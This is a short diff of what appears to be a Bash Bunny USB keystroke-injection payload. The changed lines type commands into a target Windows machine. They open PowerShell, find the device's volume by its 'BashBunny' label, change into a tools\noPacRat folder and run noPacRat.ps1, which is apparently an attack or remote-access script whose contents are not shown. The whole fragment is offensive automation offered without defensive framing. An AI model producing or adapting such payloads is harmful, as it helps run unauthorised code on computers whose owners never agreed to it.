@@ -29,7 +29,11 @@ Q STRING powershell
 Q DELAY 500
 Q ENTER
 Q DELAY 500
-Q STRING "powershell ((gwmi win32_volume -f 'label=''BashBunny''').Name+'tools\noPacRat\noPacRat.ps1')"
+Q STRING "cd ((gwmi win32_volume -f 'label=''BashBunny''').Name+'tools\noPacRat\')"
+Q DELAY 500
+Q ENTER 
+Q DELAY 500
+Q STRING "noPacRat.ps1"
 Q DELAY 500
 Q ENTER
 Q DELAY 7000
